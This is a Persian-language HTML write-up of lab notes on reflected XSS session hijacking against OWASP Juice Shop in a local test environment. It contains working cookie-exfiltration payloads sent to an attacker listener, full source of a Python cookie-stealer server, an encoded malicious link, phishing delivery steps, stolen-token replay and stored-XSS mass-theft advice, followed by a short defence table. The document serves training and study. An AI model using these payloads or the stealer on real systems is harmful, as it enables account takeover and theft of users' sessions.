@@ -1,0 +1,536 @@
+<!DOCTYPE html>
+<html lang="fa" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<title>Session Hijacking via XSS — مستندسازی کامل</title>
+<style>
+@import url('https://fonts.googleapis.com/css2?family=Vazirmatn:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500;700&display=swap');
+
+:root{
+  --bg: #0b0d10;
+  --bg-panel: #12151a;
+  --line: #262b33;
+  --text: #d7dbe0;
+  --text-dim: #838d99;
+  --red: #ff4d4f;
+  --red-dim: #7a2426;
+  --green: #3fd68a;
+  --blue: #5aa9ff;
+  --amber: #ffb454;
+  --purple: #b784ff;
+}
+
+*{box-sizing:border-box;}
+html,body{margin:0;padding:0;background:var(--bg); scroll-behavior:smooth;}
+body{
+  font-family:'Vazirmatn', sans-serif;
+  color:var(--text);
+  line-height:1.9;
+  padding:0 0 80px 0;
+}
+
+.hero{
+  padding:56px 24px 36px;
+  max-width:940px;
+  margin:0 auto;
+  border-bottom:1px solid var(--line);
+  position:relative;
+}
+.hero-tag{
+  font-family:'JetBrains Mono', monospace;
+  direction:ltr;
+  display:inline-block;
+  color:var(--red);
+  font-size:13px;
+  letter-spacing:1px;
+  border:1px solid var(--red-dim);
+  background:rgba(255,77,79,0.06);
+  padding:4px 10px;
+  border-radius:4px;
+  margin-bottom:16px;
+}
+.hero h1{ font-size:30px; font-weight:800; margin:0 0 10px; color:#fff; }
+.hero p{ color:var(--text-dim); font-size:15.5px; max-width:700px; margin:0; }
+
+.nav{
+  max-width:940px;
+  margin:0 auto;
+  padding:12px 24px;
+  display:flex; gap:8px; flex-wrap:wrap;
+  position:sticky; top:0;
+  background:rgba(11,13,16,0.92);
+  backdrop-filter:blur(6px);
+  z-index:10;
+}
+.nav a{
+  font-family:'JetBrains Mono', monospace;
+  direction:ltr; font-size:12px;
+  color:var(--text-dim);
+  text-decoration:none;
+  border:1px solid var(--line);
+  padding:5px 10px; border-radius:20px; transition:.15s;
+  white-space:nowrap;
+}
+.nav a:hover{ color:var(--red); border-color:var(--red-dim); }
+
+main{ max-width:940px; margin:0 auto; padding:0 24px; }
+section{ margin-top:52px; scroll-margin-top:70px; }
+
+.section-head{
+  display:flex; align-items:baseline; gap:12px; margin-bottom:20px;
+}
+.section-head .num{ font-family:'JetBrains Mono', monospace; color:var(--red-dim); font-size:14px; }
+.section-head h2{ font-size:20px; font-weight:700; color:#fff; margin:0; }
+
+.heading{
+  font-family:'JetBrains Mono', monospace;
+  direction:ltr; unicode-bidi:isolate;
+  display:inline-block; font-weight:700;
+  color:var(--red);
+  background:rgba(255,77,79,0.08);
+  border:1px solid var(--red-dim);
+  padding:3px 10px; border-radius:5px;
+  font-size:15px; margin-bottom:10px;
+}
+
+.card{
+  background:var(--bg-panel);
+  border:1px solid var(--line);
+  border-radius:10px;
+  padding:20px 22px;
+  margin-bottom:14px;
+}
+.card h3{ margin:0 0 8px; font-size:14.5px; color:#fff; font-weight:700; }
+.card p{ margin:6px 0 0; font-size:15px; }
+.card ul, .card ol{ margin:8px 0 0; padding-inline-start:22px; }
+.card li{ margin:5px 0; font-size:15px; }
+
+pre{
+  font-family:'JetBrains Mono', monospace;
+  direction:ltr; unicode-bidi:isolate;
+  background:#0a0c0f;
+  border:1px solid var(--line);
+  border-radius:8px;
+  padding:14px 16px;
+  overflow-x:auto;
+  font-size:13.5px; color:#c9f5d8;
+  margin:10px 0 0; line-height:1.8;
+  white-space:pre-wrap; word-break:break-all;
+}
+pre .comment{ color:var(--text-dim); }
+pre .highlight{ color:var(--amber); font-weight:700; }
+pre .ok{ color:var(--green); }
+pre .bad{ color:var(--red); }
+
+code.inline{
+  font-family:'JetBrains Mono', monospace;
+  direction:ltr; unicode-bidi:isolate;
+  background:rgba(255,255,255,0.06);
+  padding:1px 6px; border-radius:4px; font-size:0.92em;
+}
+
+.callout{
+  border-radius:8px; padding:14px 18px;
+  margin-top:12px; font-size:14.5px;
+}
+.callout.warn{
+  background:linear-gradient(135deg, rgba(255,180,84,0.12), rgba(255,180,84,0.02));
+  border:1px solid rgba(255,180,84,0.35); color:#ffdca8;
+}
+.callout.result{
+  background:linear-gradient(135deg, rgba(63,214,138,0.10), rgba(63,214,138,0.02));
+  border:1px solid rgba(63,214,138,0.3); color:#c7f5da;
+}
+.callout.info{
+  background:linear-gradient(135deg, rgba(90,169,255,0.10), rgba(90,169,255,0.02));
+  border:1px solid rgba(90,169,255,0.3); color:#cfe6ff;
+}
+.callout b{ color:var(--amber); }
+.callout.result b{ color:var(--green); }
+.callout.info b{ color:var(--blue); }
+
+.step-flow{
+  display:flex; flex-direction:column; gap:0;
+  margin-bottom:14px;
+}
+.step-item{
+  display:flex; gap:16px; align-items:flex-start;
+  position:relative;
+}
+.step-item::before{
+  content:"";
+  position:absolute;
+  right:15px; top:34px;
+  width:2px; bottom:-14px;
+  background:var(--line);
+}
+.step-item:last-child::before{ display:none; }
+.step-num{
+  font-family:'JetBrains Mono', monospace;
+  direction:ltr;
+  width:32px; height:32px; flex-shrink:0;
+  border-radius:50%;
+  border:2px solid var(--red-dim);
+  background:rgba(255,77,79,0.08);
+  color:var(--red);
+  font-size:13px; font-weight:800;
+  display:flex; align-items:center; justify-content:center;
+}
+.step-body{ flex:1; padding-bottom:24px; }
+.step-body h4{ margin:4px 0 6px; font-size:15px; color:#fff; font-weight:700; }
+.step-body p{ margin:4px 0 0; font-size:14.5px; }
+
+.divider{ border:none; border-top:1px dashed var(--line); margin:52px 0 0; }
+
+table.ref{
+  width:100%; border-collapse:collapse; margin-top:10px; font-size:14px;
+}
+table.ref th, table.ref td{
+  text-align:right; padding:9px 12px; border-bottom:1px solid var(--line);
+}
+table.ref th{ color:var(--text-dim); font-size:12px; text-transform:uppercase; letter-spacing:1px; }
+table.ref td.mono{ font-family:'JetBrains Mono', monospace; direction:ltr; font-size:13px; }
+
+.url-breakdown{
+  background:#0a0c0f;
+  border:1px solid var(--line);
+  border-radius:10px;
+  padding:16px;
+  margin-top:10px;
+  font-family:'JetBrains Mono', monospace;
+  direction:ltr; unicode-bidi:isolate;
+  font-size:13px; line-height:2;
+  word-break:break-all;
+}
+.url-breakdown .part-base{ color:var(--blue); }
+.url-breakdown .part-param{ color:var(--amber); }
+.url-breakdown .part-payload{ color:var(--red); }
+.url-breakdown .part-encoded{ color:var(--green); }
+.url-breakdown .part-label{
+  display:block;
+  color:var(--text-dim);
+  font-size:11px;
+  margin-top:10px;
+  font-family:'Vazirmatn', sans-serif;
+  direction:rtl;
+}
+
+footer{
+  max-width:940px; margin:60px auto 0;
+  padding:20px 24px 0;
+  border-top:1px solid var(--line);
+  color:var(--text-dim); font-size:13px; text-align:center;
+}
+</style>
+</head>
+<body>
+
+<div class="hero">
+  <span class="hero-tag">// XSS · SESSION HIJACKING · OWASP Juice Shop</span>
+  <h1>Session Hijacking از طریق XSS — مستندسازی کامل</h1>
+  <p>چگونه یک آسیب‌پذیری Reflected XSS در بخش جستجو، منجر به سرقت کوکی سشن قربانی و تصاحب حساب کاربری او شد — با تمام مراحل، کدها، و توضیح دقیق URL Encoding.</p>
+</div>
+
+<div class="nav">
+  <a href="#concept">مفهوم</a>
+  <a href="#discovery">کشف آسیب‌پذیری</a>
+  <a href="#server">سرور Python</a>
+  <a href="#payloads">Payload ها</a>
+  <a href="#url-encoding">URL Encoding</a>
+  <a href="#attack">حمله‌ی کامل</a>
+  <a href="#realworld">دنیای واقعی</a>
+</div>
+
+<main>
+
+<section id="concept">
+  <div class="section-head"><span class="num">§1</span><h2>مفهوم: XSS + Session Hijacking چطور کار می‌کنه؟</h2></div>
+
+  <div class="card">
+    <p>وقتی یه سایت ورودی کاربر را بدون پاک‌سازی در صفحه نشان می‌دهد، مهاجم می‌تواند کدی را تزریق کند که در مرورگر قربانی اجرا شود. اگه این کد به کوکی سشن (که هویت کاربر را ثابت می‌کند) دسترسی داشته باشد و آن را برای مهاجم بفرستد، مهاجم می‌تواند بدون دانستن پسورد، دقیقاً به‌جای قربانی وارد شود.</p>
+    <div class="callout info"><b>نکته‌ی کلیدی:</b> کوکی سشن مثل یه «کارت ورود» موقتیه — کسی که این کارت رو داشته باشه، سرور رو گول می‌زنه که فکر کنه اونه. رمز عبور اصلاً لازم نیست.</div>
+  </div>
+</section>
+
+<hr class="divider">
+
+<section id="discovery">
+  <div class="section-head"><span class="num">§2</span><h2>کشف آسیب‌پذیری — چی کار کرد، چی کار نکرد</h2></div>
+
+  <div class="card">
+    <h3>مرحله اول: تست با iframe + javascript (شکست خورد)</h3>
+    <p>اولین payload امتحان شده:</p>
+    <pre>&lt;iframe src="javascript:document.location='http://127.0.0.1:8888/?c='+document.cookie"&gt;</pre>
+    <div class="callout warn"><b>چرا شکست خورد:</b> مرورگرهای مدرن (Chrome, Firefox) اجرای <code class="inline">javascript:</code> را داخل <code class="inline">src</code> یک iframe بلاک می‌کنند. این یه محدودیت امنیتی مرورگر است، نه فیلتر سرور.</div>
+  </div>
+
+  <div class="card">
+    <h3>مرحله دوم: تست با تگ script (شکست خورد)</h3>
+    <pre>&lt;script&gt;new Image().src='http://127.0.0.1:8888/?c='+document.cookie&lt;/script&gt;</pre>
+    <div class="callout warn"><b>چرا شکست خورد:</b> Juice Shop تگ <code class="inline">&lt;script&gt;</code> را در ورودی جستجو فیلتر می‌کند.</div>
+  </div>
+
+  <div class="card">
+    <h3>مرحله سوم: تست اولیه با iframe+javascript:alert (موفق شد!)</h3>
+    <p>مستقیم در input box جستجو (نه URL):</p>
+    <pre>&lt;iframe src="javascript:alert(`xss`)"&gt;</pre>
+    <div class="callout result"><b>نتیجه:</b> Alert باز شد — یعنی این endpoint آسیب‌پذیر به XSS است.</div>
+  </div>
+
+  <div class="card">
+    <h3>مرحله چهارم: payload نهایی که کار کرد ✅</h3>
+    <pre>&lt;img src="x" onerror="new Image().src='http://127.0.0.1:8888/?c='+document.cookie"&gt;</pre>
+    <div class="callout result"><b>چرا این کار کرد:</b>
+    <br>۱. تگ <code class="inline">img</code> فیلتر نمی‌شه
+    <br>۲. وقتی مرورگر می‌خواد تصویر "x" رو لود کنه، پیداش نمی‌کنه → خطا می‌خوره → onerror اجرا می‌شه
+    <br>۳. <code class="inline">new Image().src</code> یه درخواست HTTP پس‌زمینه می‌فرسته بدون تغییر URL قربانی</div>
+  </div>
+</section>
+
+<hr class="divider">
+
+<section id="server">
+  <div class="section-head"><span class="num">§3</span><h2>سرور Python برای دریافت کوکی</h2></div>
+
+  <div class="card">
+    <h3>کد کامل سرور</h3>
+    <pre>import http.server
+import urllib.parse
+<span class="comment"># از datetime برای نمایش زمان دقیق دزدیدن کوکی</span>
+from datetime import datetime
+
+class Handler(http.server.BaseHTTPRequestHandler):
+    def do_GET(self):
+        params = urllib.parse.urlparse(self.path)
+        query = urllib.parse.parse_qs(params.query)
+        if 'c' in query:
+            print(f'\n<span class="highlight">[!] کوکی دزدیده شد — {"{datetime.now().strftime('%H:%M:%S')}"}</span>')
+            print(f'[*] IP قربانی: {"{self.client_address[0]}"}')
+            print(f'[*] کوکی: {"{query[\"c\"][0]}"}')
+        self.send_response(200)
+        self.end_headers()
+
+    <span class="comment"># این متد override شده تا لاگ‌های پیش‌فرض (IP، timestamp) پاک باشه</span>
+    <span class="comment"># و فقط اطلاعات مهم (کوکی) نمایش داده بشه</span>
+    def log_message(self, *args):
+        pass
+
+http.server.HTTPServer(('0.0.0.0', 8888), Handler).serve_forever()</pre>
+
+    <div class="callout info"><b>چرا <code class="inline">log_message</code> رو override کردیم؟</b> بدون این کار، به ازای هر درخواست یه خط لاگ پیش‌فرض مثل این چاپ می‌شد:
+    <br><code class="inline">127.0.0.1 - - [29/Aug/2026 05:01:13] "GET /?c=token=... HTTP/1.1" 200 -</code>
+    <br>که خروجی رو شلوغ می‌کرد. با override کردن، فقط چیز مهم (کوکی) نشون داده می‌شه.</div>
+  </div>
+
+  <div class="card">
+    <h3>نحوه‌ی اجرا</h3>
+    <pre><span class="comment"># ذخیره به نام cookie_stealer.py و اجرا:</span>
+python3 cookie_stealer.py
+
+<span class="comment"># خروجی وقتی کوکی دریافت می‌شه:</span>
+<span class="ok">[!] کوکی دزدیده شد — 05:01:13
+[*] IP قربانی: 127.0.0.1
+[*] کوکی: token=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9...</span></pre>
+  </div>
+</section>
+
+<hr class="divider">
+
+<section id="payloads">
+  <div class="section-head"><span class="num">§4</span><h2>مقایسه Payload ها — چرا بعضی کار نکرد</h2></div>
+
+  <table class="ref">
+    <tr><th>Payload</th><th>نتیجه</th><th>دلیل</th></tr>
+    <tr>
+      <td class="mono">&lt;iframe src="javascript:..."&gt;</td>
+      <td>❌ کار نکرد</td>
+      <td>مرورگر مدرن javascript: در src را بلاک می‌کند</td>
+    </tr>
+    <tr>
+      <td class="mono">&lt;script&gt;...&lt;/script&gt;</td>
+      <td>❌ کار نکرد</td>
+      <td>Juice Shop تگ script را فیلتر می‌کند</td>
+    </tr>
+    <tr>
+      <td class="mono">&lt;iframe src="javascript:alert(`xss`)"&gt;</td>
+      <td>✅ alert کار کرد</td>
+      <td>alert قبل از بلاک شدن اجرا می‌شود (تأیید XSS)</td>
+    </tr>
+    <tr>
+      <td class="mono">&lt;img src=x onerror="..."&gt;</td>
+      <td>✅ کوکی دزدیده شد</td>
+      <td>img فیلتر نمی‌شود، onerror از CORS آزاد است</td>
+    </tr>
+  </table>
+
+  <div class="card" style="margin-top:14px;">
+    <h3>چرا new Image() بهتر از document.location است؟</h3>
+    <pre><span class="comment">// روش بد — قربانی ریدایرکت می‌شه و می‌فهمه</span>
+<span class="bad">document.location = 'http://attacker.com/?c=' + document.cookie</span>
+
+<span class="comment">// روش خوب — پس‌زمینه، قربانی هیچ‌چیز نمی‌بینه</span>
+<span class="ok">new Image().src = 'http://attacker.com/?c=' + document.cookie</span></pre>
+    <div class="callout warn"><b>تفاوت مهم:</b> با <code class="inline">document.location</code>، آدرس‌بار مرورگر عوض می‌شود و قربانی متوجه می‌شود. با <code class="inline">new Image()</code>، یه درخواست HTTP کاملاً پس‌زمینه ارسال می‌شود — قربانی هیچ تغییری نمی‌بیند.</div>
+  </div>
+</section>
+
+<hr class="divider">
+
+<section id="url-encoding">
+  <div class="section-head"><span class="num">§5</span><h2>URL Encoding — چرا و چطور</h2></div>
+
+  <div class="card">
+    <h3>چرا باید Encode کنیم؟</h3>
+    <p>وقتی payload رو مستقیم تو URL می‌ذاریم (نه input box)، مرورگر کاراکترهای خاص مثل <code class="inline">&lt; &gt; " ' = /</code> رو به‌عنوان بخشی از ساختار URL تفسیر می‌کند، نه به‌عنوان محتوا. برای اینکه payload دست‌نخورده به سرور برسد، باید این کاراکترها را Encode کنیم.</p>
+  </div>
+
+  <div class="card">
+    <h3>جدول تبدیل کاراکترهای مهم</h3>
+    <table class="ref">
+      <tr><th>کاراکتر اصلی</th><th>URL Encoded</th><th>توضیح</th></tr>
+      <tr><td class="mono">&lt;</td><td class="mono">%3C</td><td>شروع تگ HTML</td></tr>
+      <tr><td class="mono">&gt;</td><td class="mono">%3E</td><td>پایان تگ HTML</td></tr>
+      <tr><td class="mono">"</td><td class="mono">%22</td><td>گیومه دوتایی</td></tr>
+      <tr><td class="mono">'</td><td class="mono">%27</td><td>گیومه تکی</td></tr>
+      <tr><td class="mono">=</td><td class="mono">%3D</td><td>علامت مساوی</td></tr>
+      <tr><td class="mono">space (فاصله)</td><td class="mono">%20 یا +</td><td>فاصله</td></tr>
+      <tr><td class="mono">+</td><td class="mono">%2B</td><td>علامت جمع</td></tr>
+    </table>
+  </div>
+
+  <div class="card">
+    <h3>تجزیه‌ی دقیق URL نهایی که استفاده شد</h3>
+
+    <div class="url-breakdown">
+<span class="part-base">http://127.0.0.1:3000/#/search</span><span class="part-param">?q=</span><span class="part-encoded">%3Cimg%20src%3D%22x%22%20onerror%3D%22new%20Image().src%3D%27http%3A%2F%2F127.0.0.1%3A8888%2F%3Fc%3D%27%2Bdocument.cookie%22%3E</span>
+
+<span class="part-label">⬆️ آبی: آدرس پایه سایت</span>
+<span class="part-label">⬆️ نارنجی: پارامتر q (همان ورودی جستجو)</span>
+<span class="part-label">⬆️ سبز: payload کامل به صورت URL-encoded</span>
+    </div>
+
+    <p style="margin-top:12px; font-size:14px;">payload خام (قبل از encode):</p>
+    <pre>&lt;img src="x" onerror="new Image().src='http://127.0.0.1:8888/?c='+document.cookie"&gt;</pre>
+
+    <p style="margin-top:12px; font-size:14px;">بعد از encode شدن، تبدیل می‌شه به:</p>
+    <pre>%3Cimg%20src%3D%22x%22%20onerror%3D%22new%20Image().src%3D%27http%3A%2F%2F127.0.0.1%3A8888%2F%3Fc%3D%27%2Bdocument.cookie%22%3E</pre>
+
+    <div class="callout info"><b>چطور می‌تونی خودت Encode کنی؟</b>
+    <br>در Python: <code class="inline">urllib.parse.quote(payload)</code>
+    <br>آنلاین: <code class="inline">https://www.urlencoder.org</code>
+    <br>در Burp Suite: انتخاب متن → راست‌کلیک → Convert Selection → URL Encode</div>
+  </div>
+</section>
+
+<hr class="divider">
+
+<section id="attack">
+  <div class="section-head"><span class="num">§6</span><h2>حمله‌ی کامل — قدم به قدم</h2></div>
+
+  <div class="step-flow">
+    <div class="step-item">
+      <div class="step-num">۱</div>
+      <div class="step-body">
+        <h4>راه‌اندازی سرور Cookie Stealer</h4>
+        <p>روی سیستم مهاجم، سرور Python رو اجرا کن تا منتظر دریافت کوکی بمونه:</p>
+        <pre>python3 cookie_stealer.py
+<span class="ok">Serving HTTP on 0.0.0.0 port 8888 ...</span></pre>
+      </div>
+    </div>
+
+    <div class="step-item">
+      <div class="step-num">۲</div>
+      <div class="step-body">
+        <h4>ساختن لینک مخرب</h4>
+        <p>payload را URL-encode کرده و داخل URL جستجو قرار می‌دهیم:</p>
+        <pre>http://127.0.0.1:3000/#/search?q=%3Cimg%20src%3D%22x%22%20onerror%3D%22new%20Image().src%3D%27http%3A%2F%2F127.0.0.1%3A8888%2F%3Fc%3D%27%2Bdocument.cookie%22%3E</pre>
+      </div>
+    </div>
+
+    <div class="step-item">
+      <div class="step-num">۳</div>
+      <div class="step-body">
+        <h4>فریب دادن قربانی برای کلیک روی لینک</h4>
+        <p>در دنیای واقعی، این لینک از طریق ایمیل فیشینگ، پیام مستقیم، یا کوتاه‌کننده‌ی لینک (bit.ly) برای قربانی فرستاده می‌شود. قربانی فقط یک کلیک می‌کند.</p>
+        <div class="callout warn"><b>از دید قربانی:</b> صفحه‌ی عادی جستجوی Juice Shop باز می‌شه — هیچ تغییری در URL نمی‌بیند، هیچ پاپ‌آپی نمی‌بیند، هیچ‌چیز مشکوکی حس نمی‌کند.</div>
+      </div>
+    </div>
+
+    <div class="step-item">
+      <div class="step-num">۴</div>
+      <div class="step-body">
+        <h4>اجرای خودکار payload</h4>
+        <p>مرورگر قربانی صفحه را رندر می‌کند → تگ img دیده می‌شود → سعی می‌کند تصویر "x" را لود کند → تصویر وجود ندارد → خطا → onerror اجرا می‌شود → کوکی به سرور مهاجم ارسال می‌شود.</p>
+      </div>
+    </div>
+
+    <div class="step-item">
+      <div class="step-num">۵</div>
+      <div class="step-body">
+        <h4>دریافت کوکی</h4>
+        <p>در ترمینال مهاجم:</p>
+        <pre><span class="ok">[!] کوکی دزدیده شد — 05:01:13
+[*] IP قربانی: 192.168.1.42
+[*] کوکی: token=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJkYXRhIjp7...</span></pre>
+      </div>
+    </div>
+
+    <div class="step-item">
+      <div class="step-num">۶</div>
+      <div class="step-body">
+        <h4>Session Hijacking — تصاحب حساب</h4>
+        <p>مهاجم مرورگر خودش را باز می‌کند، DevTools (F12) → Application → Cookies رو باز می‌کند و مقدار <code class="inline">token</code> را با کوکی دزدیده‌شده جایگزین می‌کند. بعد از رفرش صفحه، دقیقاً با هویت قربانی وارد شده.</p>
+        <pre><span class="comment"># یا از طریق Console مرورگر:</span>
+document.cookie = "token=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9..."</pre>
+        <div class="callout result"><b>نتیجه:</b> مهاجم بدون دانستن پسورد، کاملاً به‌جای قربانی وارد شده — می‌تواند سفارش بدهد، اطلاعات را تغییر دهد، یا داده‌های حساس را ببیند.</div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<hr class="divider">
+
+<section id="realworld">
+  <div class="section-head"><span class="num">§7</span><h2>تفاوت Reflected XSS vs Stored XSS</h2></div>
+
+  <div class="card">
+    <h3>Reflected XSS (همین چیزی که انجام دادیم)</h3>
+    <p>payload در URL است — قربانی باید روی لینک مخرب کلیک کند. هر بار که لینک باز می‌شود، payload اجرا می‌شود. اگه لینک را با کسی share نکنید، اتفاقی نمی‌افتد.</p>
+    <pre><span class="comment">لینک مخرب:</span>
+http://target.com/#/search?q=<span class="bad">&lt;img onerror=...&gt;</span>
+
+<span class="comment">قربانی این لینک رو از یه ایمیل یا پیام دریافت می‌کنه و کلیک می‌کنه</span></pre>
+  </div>
+
+  <div class="card">
+    <h3>Stored XSS (خطرناک‌تر)</h3>
+    <p>payload در دیتابیس ذخیره می‌شود — هر کسی که آن صفحه را باز کند، بدون هیچ لینک مخربی، payload روی مرورگرش اجرا می‌شود. مثلاً یک نظر مخرب زیر یک محصول.</p>
+    <pre><span class="comment">مهاجم یه نظر با این محتوا می‌نویسه:</span>
+"محصول خوبیه! &lt;img src=x onerror='...'&gt;"
+
+<span class="comment">حالا هر کاربری که صفحه‌ی محصول رو باز کنه،</span>
+<span class="comment">کوکیش دزدیده می‌شه — بدون هیچ لینک مخربی!</span></pre>
+    <div class="callout warn"><b>چرا Stored XSS بدتره؟</b> با یه حمله، می‌تونی کوکی هزاران کاربر رو به‌صورت خودکار بدزدی — بدون اینکه نیاز باشه هر کدوم رو جداگانه فریب بدی.</div>
+  </div>
+
+  <div class="card">
+    <h3>نحوه‌ی جلوگیری (Defense)</h3>
+    <table class="ref">
+      <tr><th>دفاع</th><th>توضیح</th></tr>
+      <tr><td>Output Encoding</td><td>همه‌ی ورودی‌های کاربر قبل از نمایش، HTML-encode شوند</td></tr>
+      <tr><td>HttpOnly Cookie</td><td>با این flag، JavaScript اصلاً نمی‌تواند به کوکی دسترسی داشته باشد</td></tr>
+      <tr><td>Content Security Policy</td><td>مشخص می‌کند مرورگر فقط از کدام منابع اسکریپت بارگذاری کند</td></tr>
+      <tr><td>SameSite Cookie</td><td>کوکی فقط از همان origin ارسال می‌شود</td></tr>
+    </table>
+    <div class="callout info"><b>نکته‌ی مهم:</b> اگه کوکی <code class="inline">HttpOnly</code> بود، این حمله اصلاً امکان‌پذیر نبود — چون JavaScript به کوکی دسترسی نداشت. این یه دلیل مهم برای اینکه همیشه <code class="inline">HttpOnly</code> را روی کوکی‌های سشن فعال کنید.</div>
+  </div>
+</section>
+
+</main>
+
+<footer>
+  یادداشت شخصی — XSS Session Hijacking روی OWASP Juice Shop · محیط آزمایشی محلی
+</footer>
+
+</body>
+</html>
